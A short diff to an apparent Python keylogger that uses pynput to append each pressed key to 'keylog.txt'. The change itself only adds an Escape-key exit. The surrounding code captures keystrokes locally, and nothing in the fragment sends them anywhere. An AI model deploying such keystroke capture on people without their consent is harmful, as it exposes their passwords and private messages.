@@ -3,6 +3,8 @@ from pynput import keyboard
 log_file = "keylog.txt"
 
 def on_press(key):
+    if key == keyboard.Key.esc:
+        return False
     try:
         with open(log_file, "a") as f:
             f.write(f"{key.char}")
